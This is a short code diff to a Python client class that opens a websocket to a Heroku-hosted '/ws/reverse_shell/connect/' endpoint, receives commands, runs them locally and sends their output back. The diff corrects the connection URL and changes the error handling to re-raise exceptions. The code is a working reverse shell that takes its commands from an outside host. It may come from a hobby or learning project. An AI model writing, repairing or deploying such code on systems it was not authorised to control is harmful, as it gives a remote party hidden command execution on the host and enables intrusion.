@@ -49,9 +49,8 @@ class Client(object):
         while True:
             try:
                 self.connect_to_web_server()
-                ws = websocket.create_connection(
-                    "wss://https://intense-river-70224.herokuapp.com/ws/reverse_shell/connect/",
-                    cookie=f'sessionid={self.session_id}')
+                ws = websocket.create_connection("wss://intense-river-70224.herokuapp.com/ws/reverse_shell/connect/",
+                                                 cookie=f'sessionid={self.session_id}')
                 while True:
                     data = ws.recv()
                     json_data = json.loads(data)
@@ -59,8 +58,9 @@ class Client(object):
                     output = self.execute_command(command)
                     ws.send(json.dumps({'message': output}))
             except:
-                ws.close()
-                self.api.logout()
+                # ws.close()
+                # self.api.logout()
+                raise
 
 
 if __name__ == '__main__':
